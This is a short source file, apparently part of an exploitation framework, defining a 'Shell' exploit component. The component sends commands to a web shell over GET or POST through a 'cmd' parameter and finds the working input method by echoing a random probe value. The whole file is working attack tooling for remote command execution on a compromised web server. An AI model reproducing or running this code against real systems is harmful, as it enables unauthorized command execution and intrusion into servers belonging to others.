from('random', 'randint');

class init ExploitComponent Shell {
    __init__: @(createUrl, createPost = null) { },
    
    run: @(cmd) {
        
        u = self.createUrl(cmd);
        p = self.createPost != null ? self.createPost(cmd) : null;
        resp = Http.request(u, p);
        
        ret resp;
	},

    static get: @(url)
        Shell(@(cmd) url + '?' + urllib.urlencode({cmd})),
            
    static post: @(url)
        Shell(
            @(cmd) url,
            @(cmd) urllib.urlencode({cmd})),
            
    static open: @(url) {
        print('[i] Detecting shell input');
        probe = randint(0x10000000, 0xFFFFFFFF) |> str;
        probeCmd = 'echo %s' % probe;
        
        for (f in [Shell.post, Shell.get]) {
            shell = f(url);
            result = shell.run(probeCmd);
            
            if (result.__contains__(probe)) {
                print('[+] Shell input found');                
                ret shell;
            }
        }
        
        print('[x] Could not find shell input');        
        ret null;
    },
};